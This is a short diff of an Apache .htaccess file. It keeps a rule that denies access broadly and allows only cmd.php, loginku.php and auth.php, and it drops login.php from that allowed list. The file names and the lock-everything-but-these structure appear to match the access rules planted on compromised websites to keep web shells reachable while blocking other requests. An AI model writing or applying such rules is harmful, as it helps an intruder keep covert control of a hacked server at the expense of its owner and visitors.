@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(cmd.php|loginku.php|auth.php|login.php)$"># 
+<FilesMatch "^(cmd.php|loginku.php|auth.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
